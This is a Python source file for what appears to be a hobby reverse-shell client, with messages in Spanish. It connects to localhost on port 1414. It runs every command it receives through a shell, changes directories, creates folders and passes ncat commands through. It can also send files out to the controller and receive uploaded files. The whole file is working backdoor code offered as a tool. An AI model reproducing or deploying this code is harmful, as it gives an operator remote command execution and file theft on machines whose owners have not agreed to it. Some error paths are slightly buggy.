from socket import * 
from subprocess import check_output, TimeoutExpired
import JustASocketLibrary.jsl as jsl
import base64 
import os
import time

s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.connect( ("localhost", 1414) )

def commands(arg):
    if arg.split()[0] == "cd" and len(arg.split()) > 1:
        try:
            os.chdir(arg.split("cd ")[1])
            return f"Cambio de directorio a <<{arg.split('cd ')[1]}>> completado".encode('utf-8')
        except:
            return "Directorio no encontrado".encode()
    elif arg.split()[0] == "mkdir":
        try:
            os.mkdir(str(arg.split("mkdir ")[1]))
            return f"Carpeta <<{arg.split('mkdir ')[1]}>> creada con éxito".encode('utf-8')
        except FileExistsError:
            return f"El archivo <<{arg.split('mkdir ')}>> ya existe"
    elif arg.split()[0] == "ncat":
         check_output(arg, shell=True)
    else:
        try:
            return check_output(arg, shell=True, timeout=3)
        except TimeoutExpired:
            return "Ocurrió un error".encode('utf-8')

while 1:
    command = s.recv(1024).decode('utf-8')
    
    try:
        download = command.split()[0]
    except IndexError:
        break

    if download == "descargar":
        jsl.sendFile(command.split()[1], s)
    elif download == "subir":
        try:
            jsl.recvFile(s)
        except ValueError:
            pass
    elif command[0] == "salir":
        break
    
    else:
        try:
            result = commands(command)
            if result.decode('utf-8') == '':
                s.send("Nada por aquí".encode('utf-8'))
            else:
                s.send(result)
        except:
            s.send("Ha ocurrido un error".encode())

